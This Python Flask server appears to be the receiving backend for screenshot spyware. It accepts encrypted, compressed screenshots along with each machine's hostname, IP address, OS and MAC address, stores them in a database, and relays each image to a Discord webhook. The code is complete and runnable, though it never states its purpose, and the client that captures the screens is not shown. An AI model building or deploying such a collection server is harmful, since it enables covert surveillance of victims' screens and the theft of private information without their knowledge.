from flask import Flask, request, jsonify, send_file, render_template
from flask_sqlalchemy import SQLAlchemy
import os
import zlib
import base64
from datetime import datetime
from cryptography.fernet import Fernet
from dotenv import load_dotenv
import io
import threading
import requests

load_dotenv()

DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
FERNET_KEY = os.getenv("FERNET_KEY").encode()  # bytes
SAVE_FOLDER = "received"
os.makedirs(SAVE_FOLDER, exist_ok=True)

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///images.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

fernet = Fernet(FERNET_KEY)
session = requests.Session()  # reuse TCP connection


class ImageRecord(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    filename = db.Column(db.String, unique=True, nullable=False)
    hostname = db.Column(db.String, nullable=False)
    ip = db.Column(db.String)
    os = db.Column(db.String)
    mac = db.Column(db.String)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)


def decrypt_and_decompress(data_base64: str) -> bytes:
    encrypted_data = base64.b64decode(data_base64)
    decrypted = fernet.decrypt(encrypted_data)
    return zlib.decompress(decrypted)  # giải nén ảnh PNG gốc


def send_to_discord_async(filename, img_bytes):
    def task():
        files = {"file": (filename, io.BytesIO(img_bytes), "image/png")}
        data = {"content": f"📷 Ảnh mới nhận: `{filename}`"}
        try:
            res = session.post(DISCORD_WEBHOOK_URL, data=data, files=files, timeout=10)
            print(f"[Discord] Status: {res.status_code}")
        except Exception as e:
            print(f"[!] Lỗi gửi Discord: {e}")

    thread = threading.Thread(target=task)
    thread.daemon = True
    thread.start()


@app.route("/")
def dashboard():
    return "Server is running"


@app.route("/upload", methods=["POST"])
def upload():
    try:
        content = request.get_json()
        sys_info = content["system_info"]
        image_enc = content["screenshot"]

        img_data = decrypt_and_decompress(image_enc)

        filename = f"{sys_info['hostname']}_{datetime.now().strftime('%Y%m%d_%H%M%S%f')}.png"
        path = os.path.join(SAVE_FOLDER, filename)

        with open(path, "wb") as f:
            f.write(img_data)

        # Lưu metadata vào DB
        record = ImageRecord(
            filename=filename,
            hostname=sys_info.get("hostname", ""),
            ip=sys_info.get("ip", ""),
            os=sys_info.get("os", ""),
            mac=sys_info.get("mac", ""),
            timestamp=datetime.utcnow()
        )
        db.session.add(record)
        db.session.commit()

        # Gửi ảnh Discord async
        send_to_discord_async(filename, img_data)

        return jsonify({"status": "success", "filename": filename})
    except Exception as e:
        print(f"[!] Upload Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 400


if __name__ == "__main__":
    with app.app_context():
        db.create_all()
    app.run(host="0.0.0.0", port=10000)
